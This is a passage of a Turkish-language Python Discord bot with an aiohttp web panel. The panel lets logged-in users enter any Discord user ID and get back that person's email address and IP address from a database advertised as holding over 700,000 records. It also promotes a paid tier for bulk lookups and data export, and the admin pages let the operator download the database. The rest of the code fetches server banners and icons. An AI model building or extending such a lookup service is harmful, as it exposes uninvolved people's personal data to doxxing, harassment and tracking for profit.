            .result-found {{ border-color: rgba(0,255,100,0.3); }}
            .result-not-found {{ border-color: rgba(255,0,85,0.3); }}
            .result-title {{ font-family: 'Orbitron', monospace; font-size: 1rem; margin-bottom: 16px; display: flex; align-items: center; gap: 10px; }}
            .result-title.found {{ color: #00ff64; }}
            .result-title.not-found {{ color: #ff0055; }}
            .result-grid {{ display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }}
            .result-item {{ background: rgba(255,255,255,0.03); border-radius: 12px; padding: 16px; }}
            .result-label {{ font-size: 0.75rem; color: rgba(255,255,255,0.4); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }}
            .result-value {{ font-family: 'Orbitron', monospace; font-size: 0.95rem; color: var(--accent); word-break: break-all; }}
            .loading {{ display: none; text-align: center; padding: 20px; }}
            .spinner {{ width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }}
            @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
            
            .extra-sections {{ display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-top: 40px; }}
            .section-card {{ background: rgba(20,20,30,0.6); border: 1px solid rgba(255,255,255,0.08); border-radius: 24px; padding: 30px; backdrop-filter: blur(40px); }}
            .section-title {{ font-family: 'Orbitron', monospace; font-size: 1.1rem; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }}
            
            .status-list {{ display: flex; flex-direction: column; gap: 14px; }}
            .status-item {{ display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: rgba(255,255,255,0.03); border-radius: 12px; }}
            .status-name {{ display: flex; align-items: center; gap: 10px; color: rgba(255,255,255,0.8); }}
            .status-dot {{ width: 10px; height: 10px; border-radius: 50%; animation: pulse 2s infinite; }}
            .status-dot.online {{ background: #00ff64; box-shadow: 0 0 10px #00ff64; }}
            .status-dot.warning {{ background: #ffaa00; box-shadow: 0 0 10px #ffaa00; }}
            .status-value {{ font-family: 'Orbitron', monospace; font-size: 0.85rem; color: var(--accent); }}
            @keyframes pulse {{ 0%, 100% {{ opacity: 1; }} 50% {{ opacity: 0.5; }} }}
            
            .premium-card {{ border: 1px solid rgba(255,215,0,0.3); background: linear-gradient(135deg, rgba(255,215,0,0.05), rgba(255,0,85,0.05)); }}
            .premium-badge {{ background: linear-gradient(135deg, #ffd700, #ff8c00); padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 700; color: #000; text-transform: uppercase; }}
            .premium-features {{ display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }}
            .premium-feature {{ display: flex; align-items: center; gap: 12px; color: rgba(255,255,255,0.7); font-size: 0.9rem; }}
            .premium-feature i {{ color: #ffd700; width: 20px; }}
            .premium-btn {{ width: 100%; padding: 14px; background: linear-gradient(135deg, #ffd700, #ff8c00); border: none; border-radius: 12px; color: #000; font-weight: 700; font-size: 0.95rem; cursor: pointer; transition: transform 0.3s, box-shadow 0.3s; }}
            .premium-btn:hover {{ transform: translateY(-2px); box-shadow: 0 8px 24px rgba(255,215,0,0.3); }}
            .premium-price {{ text-align: center; margin-bottom: 16px; }}
            .premium-price .old {{ text-decoration: line-through; color: rgba(255,255,255,0.4); font-size: 0.9rem; }}
            .premium-price .new {{ font-family: 'Orbitron', monospace; font-size: 1.8rem; color: #ffd700; }}
            .premium-price .period {{ color: rgba(255,255,255,0.5); font-size: 0.85rem; }}
            
            @media (max-width: 768px) {{ .result-grid {{ grid-template-columns: 1fr; }} .stats-bar {{ flex-direction: column; gap: 16px; }} .search-box {{ flex-direction: column; }} .extra-sections {{ grid-template-columns: 1fr; }} }}
        </style>
    </head>
    <body>
        <div class="bg-grid"></div>
        <div class="bg-glow"></div>
        
        <nav class="navbar">
            <div class="nav-logo">DEHŞET</div>
            <div class="user-info">
                <img src="{avatar_url}" alt="Avatar" class="user-avatar">
                <span class="user-name">{user['username']}</span>
            </div>
        </nav>
        
        <main class="main-container">
            <div class="welcome-section">
                <h1 class="welcome-title">Hoş Geldin, {user['username']}!</h1>
                <p class="welcome-subtitle">Discord ID sorgulama paneline erişim sağladın</p>
            </div>
            
            <div class="stats-bar">
                <div class="stat-box">
                    <div class="stat-number">700K+</div>
                    <div class="stat-label">Kayıtlı Veri</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">24/7</div>
                    <div class="stat-label">Aktif Sistem</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">&lt;1s</div>
                    <div class="stat-label">Yanıt Süresi</div>
                </div>
            </div>
            
            <div class="search-section">
                <h2 class="search-title"><i class="fas fa-search"></i> Discord ID Sorgula</h2>
                <div class="search-box">
                    <input type="text" id="searchInput" class="search-input" placeholder="Discord ID girin (örn: 123456789012345678)" maxlength="20">
                    <button id="searchBtn" class="search-btn"><i class="fas fa-search"></i> Sorgula</button>
                </div>
                
                <div id="loading" class="loading">
                    <div class="spinner"></div>
                    <p style="margin-top: 12px; color: rgba(255,255,255,0.5);">Aranıyor...</p>
                </div>
                
                <div id="resultContainer" class="result-container">
                    <div id="resultCard" class="result-card">
                        <div id="resultTitle" class="result-title"></div>
                        <div id="resultContent"></div>
                    </div>
                </div>
            </div>
            
            <div class="extra-sections">
                <div class="section-card">
                    <h3 class="section-title"><i class="fas fa-server" style="color: var(--accent);"></i> Sunucu Durumu</h3>
                    <div class="status-list">
                        <div class="status-item">
                            <div class="status-name">
                                <span class="status-dot online"></span>
                                API Servisi
                            </div>
                            <span class="status-value">Aktif</span>
                        </div>
                        <div class="status-item">
                            <div class="status-name">
                                <span class="status-dot online"></span>
                                Veritabanı
                            </div>
                            <span class="status-value">99.9%</span>
                        </div>
                        <div class="status-item">
                            <div class="status-name">
                                <span class="status-dot online"></span>
                                Uptime
                            </div>
                            <span class="status-value">47 Gun</span>
                        </div>
                        <div class="status-item">
                            <div class="status-name">
                                <span class="status-dot online"></span>
                                Response Time
                            </div>
                            <span class="status-value">23ms</span>
                        </div>
                        <div class="status-item">
                            <div class="status-name">
                                <span class="status-dot warning"></span>
                                CDN Servisi
                            </div>
                            <span class="status-value">Yuksek Yuk</span>
                        </div>
                    </div>
                </div>
                
                <div class="section-card premium-card">
                    <h3 class="section-title"><i class="fas fa-crown" style="color: #ffd700;"></i> Premium Uyelik <span class="premium-badge">VIP</span></h3>
                    <div class="premium-price">
                        <span class="old">149.99 TL</span>
                        <div class="new">79.99 TL</div>
                        <span class="period">/ aylik</span>
                    </div>
                    <div class="premium-features">
                        <div class="premium-feature"><i class="fas fa-infinity"></i> Sinirsiz ID Sorgu</div>
                        <div class="premium-feature"><i class="fas fa-bolt"></i> Oncelikli API Erisimi</div>
                        <div class="premium-feature"><i class="fas fa-database"></i> Toplu Sorgu (100 ID/dk)</div>
                        <div class="premium-feature"><i class="fas fa-download"></i> Data Export (CSV/JSON)</div>
                        <div class="premium-feature"><i class="fas fa-headset"></i> 7/24 Destek</div>
                        <div class="premium-feature"><i class="fas fa-shield-alt"></i> Gelismis Guvenlik</div>
                    </div>
                    <button class="premium-btn" onclick="alert('Premium uyelik yakinda aktif olacak!')"><i class="fas fa-crown"></i> Premium'a Yukselt</button>
                </div>
            </div>
        </main>
        
        <script>
            const searchInput = document.getElementById('searchInput');
            const searchBtn = document.getElementById('searchBtn');
            const loading = document.getElementById('loading');
            const resultContainer = document.getElementById('resultContainer');
            const resultCard = document.getElementById('resultCard');
            const resultTitle = document.getElementById('resultTitle');
            const resultContent = document.getElementById('resultContent');
            
            searchInput.addEventListener('keypress', (e) => {{ if (e.key === 'Enter') search(); }});
            searchBtn.addEventListener('click', search);
            
            async function search() {{
                const id = searchInput.value.trim();
                if (!id || !/^\\d+$/.test(id)) {{
                    alert('Lütfen geçerli bir Discord ID girin!');
                    return;
                }}
                
                searchBtn.disabled = true;
                loading.style.display = 'block';
                resultContainer.style.display = 'none';
                
                try {{
                    const response = await fetch('/api/search?id=' + encodeURIComponent(id));
                    const data = await response.json();
                    
                    loading.style.display = 'none';
                    resultContainer.style.display = 'block';
                    
                    if (data.found) {{
                        resultCard.className = 'result-card result-found';
                        resultTitle.className = 'result-title found';
                        resultTitle.innerHTML = '<i class="fas fa-check-circle"></i> Kullanıcı Bulundu';
                        resultContent.innerHTML = `
                            <div class="result-grid">
                                <div class="result-item">
                                    <div class="result-label">Discord ID</div>
                                    <div class="result-value">${{data.discord_id}}</div>
                                </div>
                                <div class="result-item">
                                    <div class="result-label">Email</div>
                                    <div class="result-value">${{data.email || 'Bilinmiyor'}}</div>
                                </div>
                                <div class="result-item">
                                    <div class="result-label">IP Adresi</div>
                                    <div class="result-value">${{data.ip_address || 'Bilinmiyor'}}</div>
                                </div>
                            </div>
                        `;
                    }} else {{
                        resultCard.className = 'result-card result-not-found';
                        resultTitle.className = 'result-title not-found';
                        resultTitle.innerHTML = '<i class="fas fa-times-circle"></i> Kullanıcı Bulunamadı';
                        resultContent.innerHTML = '<p style="color: rgba(255,255,255,0.5); text-align: center;">Bu ID veritabanında kayıtlı değil.</p>';
                    }}
                }} catch (error) {{
                    loading.style.display = 'none';
                    alert('Bir hata oluştu: ' + error.message);
                }}
                
                searchBtn.disabled = false;
            }}
        </script>
    </body>
    </html>
    """, content_type='text/html')

async def handle_api_search(request):
    session_token = request.cookies.get('session_token')
    
    if not session_token or session_token not in user_sessions:
        return web.json_response({"error": "Unauthorized"}, status=401)
    
    user = user_sessions[session_token]
    discord_id = request.query.get('id', '').strip()
    if not discord_id or not discord_id.isdigit():
        return web.json_response({"error": "Invalid ID"}, status=400)
    
    result = query_database(discord_id)
    
    await send_query_log(user['username'], user['user_id'], discord_id, result)
    
    return web.json_response(result)

async def handle_static(request):
    filename = request.match_info.get('filename', '')
    file_path = f"attached_assets/generated_images/{filename}"
    
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            content = f.read()
        return web.Response(body=content, content_type='image/png')
    return web.Response(text="Not found", status=404)

ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', '')
admin_sessions = {}

async def handle_admin(request):
    session_token = request.cookies.get('admin_session')
    
    if session_token and session_token in admin_sessions:
        return web.HTTPFound('/admin/files')
    
    return web.Response(text="""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Girişi</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Inter', sans-serif; background: #0a0a0f; min-height: 100vh; display: flex; align-items: center; justify-content: center; color: white; }
            .login-box { background: rgba(20,20,30,0.8); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 40px; width: 100%; max-width: 400px; }
            h1 { font-size: 1.5rem; margin-bottom: 30px; text-align: center; color: #ff0055; }
            input { width: 100%; padding: 14px 16px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; color: white; font-size: 1rem; margin-bottom: 20px; }
            input:focus { outline: none; border-color: #ff0055; }
            button { width: 100%; padding: 14px; background: linear-gradient(135deg, #ff0055, #7c3aed); border: none; border-radius: 10px; color: white; font-weight: 600; cursor: pointer; font-size: 1rem; }
            button:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(255,0,85,0.3); }
            .error { color: #ff0055; font-size: 0.9rem; margin-bottom: 15px; display: none; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>Admin Girişi</h1>
            <div id="error" class="error">Hatalı şifre!</div>
            <form action="/admin/login" method="POST">
                <input type="password" name="password" placeholder="Şifre" required>
                <button type="submit">Giriş Yap</button>
            </form>
        </div>
    </body>
    </html>
    """, content_type='text/html')

async def handle_admin_login(request):
    data = await request.post()
    password = data.get('password', '')
    
    if password == ADMIN_PASSWORD:
        session_token = secrets.token_urlsafe(32)
        admin_sessions[session_token] = True
        
        response = web.HTTPFound('/admin/files')
        response.set_cookie('admin_session', session_token, max_age=86400, httponly=True)
        return response
    
    return web.Response(text="""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Girişi</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Inter', sans-serif; background: #0a0a0f; min-height: 100vh; display: flex; align-items: center; justify-content: center; color: white; }
            .login-box { background: rgba(20,20,30,0.8); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 40px; width: 100%; max-width: 400px; }
            h1 { font-size: 1.5rem; margin-bottom: 30px; text-align: center; color: #ff0055; }
            input { width: 100%; padding: 14px 16px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; color: white; font-size: 1rem; margin-bottom: 20px; }
            input:focus { outline: none; border-color: #ff0055; }
            button { width: 100%; padding: 14px; background: linear-gradient(135deg, #ff0055, #7c3aed); border: none; border-radius: 10px; color: white; font-weight: 600; cursor: pointer; font-size: 1rem; }
            button:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(255,0,85,0.3); }
            .error { color: #ff0055; font-size: 0.9rem; margin-bottom: 15px; text-align: center; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>Admin Girişi</h1>
            <div class="error">Hatalı şifre!</div>
            <form action="/admin/login" method="POST">
                <input type="password" name="password" placeholder="Şifre" required>
                <button type="submit">Giriş Yap</button>
            </form>
        </div>
    </body>
    </html>
    """, content_type='text/html')

async def handle_admin_files(request):
    session_token = request.cookies.get('admin_session')
    
    if not session_token or session_token not in admin_sessions:
        return web.HTTPFound('/admin')
    
    downloadable_files = ['bot.py', 'discord_data.db', 'requirements.txt', 'authorized_users.json', 'guild_settings.json', 'safe_list.json', 'stats.json', 'ticket_settings.json', 'tickets.json', 'verified_users.json', 'user_ids.txt', 'data.txt', 'komutlar.txt']
    
    files_html = ""
    for f in downloadable_files:
        if os.path.exists(f):
            size = os.path.getsize(f)
            size_str = f"{size/1024:.1f} KB" if size > 1024 else f"{size} B"
            files_html += f'''
            <div class="file-item">
                <div class="file-info">
                    <i class="fas fa-file-code"></i>
                    <span>{f}</span>
                    <span class="file-size">{size_str}</span>
                </div>
                <a href="/admin/download/{f}" class="download-btn"><i class="fas fa-download"></i> İndir</a>
            </div>
            '''
    
    return web.Response(text=f"""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Dosya Yönetimi</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: 'Inter', sans-serif; background: #0a0a0f; min-height: 100vh; color: white; padding: 40px 20px; }}
            .container {{ max-width: 800px; margin: 0 auto; }}
            h1 {{ font-size: 2rem; margin-bottom: 30px; color: #ff0055; text-align: center; }}
            .file-list {{ display: flex; flex-direction: column; gap: 12px; }}
            .file-item {{ display: flex; justify-content: space-between; align-items: center; padding: 16px 20px; background: rgba(20,20,30,0.8); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; }}
            .file-info {{ display: flex; align-items: center; gap: 12px; }}
            .file-info i {{ color: #7c3aed; }}
            .file-size {{ color: rgba(255,255,255,0.4); font-size: 0.85rem; }}
            .download-btn {{ padding: 10px 20px; background: linear-gradient(135deg, #ff0055, #7c3aed); border: none; border-radius: 8px; color: white; text-decoration: none; font-weight: 600; font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }}
            .download-btn:hover {{ transform: translateY(-2px); box-shadow: 0 8px 24px rgba(255,0,85,0.3); }}
            .logout {{ display: block; text-align: center; margin-top: 30px; color: rgba(255,255,255,0.5); text-decoration: none; }}
            .logout:hover {{ color: #ff0055; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1><i class="fas fa-folder-open"></i> Dosya Yönetimi</h1>
            <div class="file-list">
                {files_html}
            </div>
            <a href="/admin/logout" class="logout"><i class="fas fa-sign-out-alt"></i> Çıkış Yap</a>
        </div>
    </body>
    </html>
    """, content_type='text/html')

async def handle_admin_download(request):
    session_token = request.cookies.get('admin_session')
    
    if not session_token or session_token not in admin_sessions:
        return web.HTTPFound('/admin')
    
    filename = request.match_info.get('filename', '')
    allowed_files = ['bot.py', 'discord_data.db', 'requirements.txt', 'authorized_users.json', 'guild_settings.json', 'safe_list.json', 'stats.json', 'ticket_settings.json', 'tickets.json', 'verified_users.json', 'user_ids.txt', 'data.txt', 'komutlar.txt']
    
    if filename not in allowed_files or not os.path.exists(filename):
        return web.Response(text="Dosya bulunamadı", status=404)
    
    with open(filename, 'rb') as f:
        content = f.read()
    
    return web.Response(
        body=content,
        headers={
            'Content-Disposition': f'attachment; filename="{filename}"',
            'Content-Type': 'application/octet-stream'
        }
    )

async def handle_admin_logout(request):
    session_token = request.cookies.get('admin_session')
    
    if session_token and session_token in admin_sessions:
        del admin_sessions[session_token]
    
    response = web.HTTPFound('/admin')
    response.del_cookie('admin_session')
    return response

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_index)
    app.router.add_get('/callback', handle_callback)
    app.router.add_get('/panel', handle_panel)
    app.router.add_get('/api/search', handle_api_search)
    app.router.add_get('/static/{filename}', handle_static)
    app.router.add_get('/admin', handle_admin)
    app.router.add_post('/admin/login', handle_admin_login)
    app.router.add_get('/admin/files', handle_admin_files)
    app.router.add_get('/admin/download/{filename}', handle_admin_download)
    app.router.add_get('/admin/logout', handle_admin_logout)
    
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 5000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web sunucusu başlatıldı: https://{SITE_DOMAIN} (Port: {port})")

@bot.event
async def on_ready():
    print(f'{bot.user} olarak giriş yapıldı!')
    
    try:
        synced = await bot.tree.sync()
        print(f"{len(synced)} slash komut senkronize edildi!")
    except Exception as e:
        print(f"Slash komut senkronizasyon hatası: {e}")
    
    await start_web_server()
    print(f"OAuth2 URL: https://{os.environ.get('REPLIT_DEV_DOMAIN', '')}")

@bot.tree.command(name="banner", description="Bulunduğunuz sunucunun bannerini DM olarak alın")
async def banner_command(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    if not interaction.guild:
        await interaction.followup.send("Bu komut sadece sunucularda kullanılabilir!", ephemeral=True)
        return
    
    guild = interaction.guild
    
    try:
        if guild.banner:
            banner_url = guild.banner.url
            
            embed = discord.Embed(
                title=f"🖼️ {guild.name} - Sunucu Banner",
                color=0x9b59b6,
                timestamp=datetime.datetime.now()
            )
            embed.set_image(url=banner_url)
            embed.add_field(name="📥 İndirme Linki", value=f"[Tıkla]({banner_url})", inline=True)
            embed.set_footer(text=f"İsteyen: {interaction.user.name}")
            
            try:
                dm_channel = await interaction.user.create_dm()
                await dm_channel.send(embed=embed)
                await interaction.followup.send("✅ Sunucu banneri DM olarak gönderildi!", ephemeral=True)
            except discord.Forbidden:
                await interaction.followup.send("❌ DM gönderemiyorum! Lütfen DM'lerinizi açın.", ephemeral=True)
        else:
            await interaction.followup.send("❌ Bu sunucunun banner'ı yok!", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Hata: {str(e)}", ephemeral=True)

@bot.tree.command(name="profil", description="Herhangi bir sunucunun banner veya profilini alın")
@app_commands.describe(
    sunucu_id="Sunucu ID'si veya davet linki",
    tur="Banner veya profil resmi"
)
@app_commands.choices(tur=[
    app_commands.Choice(name="Banner", value="banner"),
    app_commands.Choice(name="Profil (Sunucu İkonu)", value="icon")
])
async def profil_command(interaction: discord.Interaction, sunucu_id: str, tur: str = "banner"):
    await interaction.response.defer(ephemeral=True)
    
    guild_id = None
    guild_name = "Bilinmiyor"
    guild_icon = None
    guild_banner = None
    guild_splash = None
    
    if sunucu_id.startswith("https://discord.gg/") or sunucu_id.startswith("discord.gg/"):
        invite_code = sunucu_id.replace("https://discord.gg/", "").replace("discord.gg/", "").split("/")[0].split("?")[0]
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://discord.com/api/v10/invites/{invite_code}?with_counts=true") as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        guild_id = data.get("guild", {}).get("id")
                        guild_name = data.get("guild", {}).get("name", "Bilinmiyor")
                        guild_icon = data.get("guild", {}).get("icon")
                        guild_banner = data.get("guild", {}).get("banner")
                        guild_splash = data.get("guild", {}).get("splash")
                    else:
                        await interaction.followup.send("❌ Geçersiz davet linki!", ephemeral=True)
                        return
        except Exception as e:
            await interaction.followup.send(f"❌ Davet linki alınamadı: {str(e)}", ephemeral=True)
            return
    else:
        try:
            guild_id = int(sunucu_id.strip())
        except ValueError:
            await interaction.followup.send("❌ Geçersiz sunucu ID'si! Sayı veya davet linki girin.", ephemeral=True)
            return
        
        local_guild = bot.get_guild(guild_id)
        if local_guild:
            guild_name = local_guild.name
            guild_icon = local_guild.icon.key if local_guild.icon else None
            guild_banner = local_guild.banner.key if local_guild.banner else None
            guild_splash = local_guild.splash.key if local_guild.splash else None
        else:
            try:
                async with aiohttp.ClientSession() as session:
                    headers = {"Authorization": f"Bot {os.environ.get('DISCORD_BOT_TOKEN')}"}
                    async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/preview", headers=headers) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            guild_name = data.get("name", "Bilinmiyor")
                            guild_icon = data.get("icon")
                            guild_banner = data.get("banner") or data.get("splash")
                            guild_splash = data.get("splash")
                        else:
                            widget_resp = await session.get(f"https://discord.com/api/v10/guilds/{guild_id}/widget.json")
                            if widget_resp.status == 200:
                                widget_data = await widget_resp.json()
                                guild_name = widget_data.get("name", "Bilinmiyor")
                                guild_icon = None
                                guild_banner = None
                                guild_splash = None
                            else:
                                await interaction.followup.send("❌ Bu sunucuya erişilemiyor! Bot sunucuda olmadığı için sadece davet linki ile veya widget açık sunuculara erişilebilir.", ephemeral=True)
                                return
            except Exception as e:
                await interaction.followup.send(f"❌ Sunucu bilgisi alınamadı: {str(e)}", ephemeral=True)
                return
    
    try:
        embed = discord.Embed(
            title=f"🖼️ {guild_name}",
            color=0x9b59b6,
            timestamp=datetime.datetime.now()
        )
        
        image_found = False
        
        if tur == "banner":
            if guild_banner:
                ext = "gif" if guild_banner.startswith("a_") else "png"
                banner_url = f"https://cdn.discordapp.com/banners/{guild_id}/{guild_banner}.{ext}?size=4096"
                embed.set_image(url=banner_url)
                embed.add_field(name="📥 Banner İndirme", value=f"[Tıkla]({banner_url})", inline=True)
                image_found = True
            elif guild_splash:
                ext = "gif" if guild_splash.startswith("a_") else "png"
                splash_url = f"https://cdn.discordapp.com/splashes/{guild_id}/{guild_splash}.{ext}?size=4096"
                embed.set_image(url=splash_url)
                embed.add_field(name="📥 Splash İndirme", value=f"[Tıkla]({splash_url})", inline=True)
                embed.description = "⚠️ Bu sunucunun banner'ı yok, splash resmi gönderiliyor."
                image_found = True
            else:
                await interaction.followup.send("❌ Bu sunucunun banner veya splash resmi yok!", ephemeral=True)
                return
        else:
            if guild_icon:
                ext = "gif" if guild_icon.startswith("a_") else "png"
                icon_url = f"https://cdn.discordapp.com/icons/{guild_id}/{guild_icon}.{ext}?size=4096"
                embed.set_image(url=icon_url)
                embed.add_field(name="📥 İkon İndirme", value=f"[Tıkla]({icon_url})", inline=True)
                image_found = True
            else:
                await interaction.followup.send("❌ Bu sunucunun profil resmi yok!", ephemeral=True)
                return
        
        if image_found:
            embed.set_footer(text=f"İsteyen: {interaction.user.name} | Sunucu ID: {guild_id}")
            
            try:
                dm_channel = await interaction.user.create_dm()
                await dm_channel.send(embed=embed)
                await interaction.followup.send(f"✅ {guild_name} sunucusunun {'banner' if tur == 'banner' else 'profil resmi'} DM olarak gönderildi!", ephemeral=True)
            except discord.Forbidden:
                await interaction.followup.send("❌ DM gönderemiyorum! Lütfen DM'lerinizi açın.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Hata: {str(e)}", ephemeral=True)

TOKEN = os.environ.get('DISCORD_BOT_TOKEN')
if TOKEN:
    bot.run(TOKEN)
else:
    print("DISCORD_BOT_TOKEN bulunamadı! Lütfen Secrets bölümüne token'ınızı ekleyin.")
